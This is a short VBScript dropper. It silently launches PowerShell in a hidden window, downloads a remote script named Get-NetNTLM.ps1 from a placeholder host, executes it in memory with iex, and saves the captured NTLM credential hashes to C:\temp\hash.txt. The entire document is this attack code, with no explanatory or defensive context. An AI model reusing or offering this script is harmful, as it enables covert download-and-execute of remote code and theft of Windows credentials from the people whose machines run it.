Set Shell = CreateObject("WScript.Shell")
Shell.Run "powershell.exe -Command ""iex (New-Object Net.WebClient).DownloadString('https://site/Get-NetNTLM.ps1') >> C:\temp\hash.txt 2>&1""", 0, True
Set Shell = Nothing
